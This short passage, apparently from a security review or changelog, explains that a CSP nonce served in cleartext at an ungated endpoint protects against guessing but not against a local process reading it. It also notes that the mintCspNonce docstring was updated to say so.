5. **The nonce is not secret from this machine.** It is served in cleartext at the ungated `GET /`, exactly like the session token. It defends against GUESSING, not against a local process reading it — the same-machine half of DW-2 that its ledger entry explicitly carved out and left open. `mintCspNonce`'s docstring now says so rather than leaving the token-shaped guarantees to imply otherwise.
